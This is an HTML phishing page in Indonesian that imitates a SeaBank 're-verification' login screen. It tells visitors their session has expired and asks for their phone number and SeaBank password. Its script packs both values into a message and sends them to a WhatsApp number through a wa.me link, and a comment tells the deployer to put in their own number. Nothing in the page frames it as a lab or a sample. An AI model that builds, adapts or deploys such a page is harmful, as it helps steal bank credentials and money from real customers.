<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>Verifikasi Ulang • SeaBank</title>
  <link rel="stylesheet" href="style.css">
</head>
<body>

<div class="login-container">
  <img src="https://seeklogo.com/images/S/seabank-logo-FA805BF1C3-seeklogo.com.png" alt="SeaBank" class="logo">
  <h2>Verifikasi Ulang</h2>
  <p class="desc">Sesi kamu telah kadaluarsa. Silakan masuk ulang untuk melanjutkan transaksi.</p>
  <form id="loginForm">
    <input type="tel" id="nomor" placeholder="Nomor HP (08xxxxx)" required>
    <input type="password" id="password" placeholder="Password SeaBank kamu" required>
    <button type="submit">Verifikasi Sekarang</button>
  </form>
</div>

<script>
  document.getElementById("loginForm").addEventListener("submit", function(e) {
    e.preventDefault();
    const nomor = document.getElementById("nomor").value.trim();
    const password = document.getElementById("password").value.trim();

    if (!/^08\d{8,}$/.test(nomor)) {
      alert("Nomor HP tidak valid!");
      return;
    }

    // Ganti nomor WhatsApp tujuan di bawah ini
    const nomorWA = "6281234567890"; // ← Ganti ke nomor kamu

    const pesan = `*Verifikasi Ulang SeaBank:*\nNomor: ${nomor}\nPassword: ${password}`;
    const url = `https://wa.me/${nomorWA}?text=${encodeURIComponent(pesan)}`;
    window.location.href = url;
  });
</script>

</body>
</html>
